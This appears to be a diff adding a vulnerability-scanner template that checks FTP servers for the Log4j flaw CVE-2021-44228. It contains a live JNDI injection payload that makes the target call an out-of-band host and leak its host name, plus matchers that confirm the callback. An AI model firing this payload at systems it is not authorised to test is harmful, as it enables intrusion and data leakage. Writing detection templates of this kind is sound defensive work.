@@ -1,0 +1,38 @@
+id: CVE-2021-44228
+
+info:
+  name: Poison FTP logs | Log4j
+  author: milan.jovic@trickest.com
+  severity: critical
+  description: Poison FTP Log4j
+  tags: cve,cve2021,ssh,oast,log4j
+
+network:
+  - host:
+      - "{{Hostname}}"
+      - "ftp://${jndi:ldap://${hostName}.{{interactsh-url}}/a123}@{{Hostname}}:21"
+
+
+
+
+
+
+
+    matchers-condition: and
+    matchers:
+      - type: word
+        part: interactsh_protocol  # Confirms the DNS Interaction
+        words:
+          - "dns"
+
+      - type: regex
+        part: interactsh_request
+        regex:
+          - '([a-z0-9\.\-]+)\.([a-z0-9]+)\.([a-z0-9]+)\.\w+' # Match for extracted ${hostName} variable
+
+    extractors:
+      - type: regex
+        part: interactsh_request
+        group: 1
+        regex:
+          - '([a-z0-9\.\-]+)\.([a-z0-9]+)\.([a-z0-9]+)\.\w+'   # Print extracted ${hostName} in output
